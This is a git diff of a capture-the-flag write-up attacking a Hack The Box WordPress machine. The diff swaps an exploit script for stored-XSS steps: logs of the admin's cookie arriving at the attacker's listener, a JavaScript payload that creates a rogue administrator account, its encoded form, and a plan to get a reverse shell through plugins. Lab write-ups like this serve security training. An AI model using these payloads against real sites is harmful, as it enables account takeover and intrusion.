@@ -262,27 +262,80 @@ print(encrypted_payload)
 ```
 {% endcode %}
 
-**exploit.py**
+**i copy the output and past it on the request**&#x20;
+
+<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+
+**i triggered by sending another time the message**&#x20;
 
 {% code overflow="wrap" %}
-```python
-import requests
-
-url = "https://makesense.htb/wp-admin/admin-ajax.php"
-
-# Replace these with values from a legitimate request you captured
-VALID_NONCE = "f3142630f4"
-VALID_POST_ID = "103"
-
-data = {
-    'action': 'save_voice_results',
-    'nonce': VALID_NONCE,
-    'post_id': VALID_POST_ID,
-    'encrypted_payload': '<ENC>' # The output from the previous script
-}
-
-response = requests.post(url, data=data, verify=False)
-print(response.status_code)
-print(response.text)
+```bash
+serv 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.129.31.75 - - [07/Jul/2026 08:34:28] "GET /?c=wp-settings-time-3=1783427669 HTTP/1.1" 200 -
+10.129.31.75 - - [07/Jul/2026 08:34:28] "GET /?c=wp-settings-time-3=1783427669 HTTP/1.1" 200 -
 ```
 {% endcode %}
+
+**So now the idea is to create an admin user account**
+
+**so i create a payload and using java manifesting**&#x20;
+
+{% code overflow="wrap" %}
+```javascript
+// payload.js
+fetch('/wp-admin/user-new.php', {credentials: 'include'})
+  .then(r => r.text())
+  .then(html => {
+    const match = html.match(/id="_wpnonce_create-user"[^>]*value="([^"]+)"/);
+    if (match) {
+      const nonce = match[1];
+      const data = new URLSearchParams({
+        'action': 'createuser',
+        '_wpnonce_create-user': nonce,
+        '_wp_http_referer': '/wp-admin/user-new.php',
+        'user_login': 'hacker',
+        'email': 'hacker@test.com',
+        'pass1': 'Password123!',
+        'pass2': 'Password123!',
+        'role': 'administrator',
+        'createuser': 'Add New User'
+      });
+      fetch('/wp-admin/user-new.php', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: data.toString()
+      });
+    }
+  });
+```
+{% endcode %}
+
+**then using the script we encode it and this what we encode exactly**
+
+<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+python3 encode.py
+VqjzdnC78e2ykaa2N5onGMqZ1z0xnGh9o4ZLluKaCimQvefGzSRjt0wObGHW5WD/jT1tyG0/xgKTOjtFppRNrHqXpI+whF8Hkzb9FBrobx2FEE/iCkofJO7YpZVVoFSHM2f06Axf5Ueyzi+tduVxOkmWUP4vWFjCfw6hOxu5QDHuOyu8y+EF0LzzVrh5T/XUj7j9GNmFG2rxqHWNNw3bJBaXxqZmdzse9dE65ZnIQm3kNtBmzgw7NPX9
+```
+{% endcode %}
+
+**so i send a new message and on the message the paylod not encoded and on burp we receive the encoded paylaod and the clear message i change the encoded payload by this and i resent the clear paylaod and i opne my server web on 2222 to see if admin visit it**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+serv 2222
+Serving HTTP on 0.0.0.0 port 2222 (http://0.0.0.0:2222/) ...
+10.129.31.75 - - [07/Jul/2026 09:05:29] "GET /payload1.js HTTP/1.1" 200 -
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
+
+&#x20;<mark style="color:blue;">**Step 5**</mark>
+
+**Now let's take reverse shell  the most probably on WP we take it from a plugins or something like that let's search on dahsboard what plugins are isntalled and if they're are vulnerable**&#x20;
+
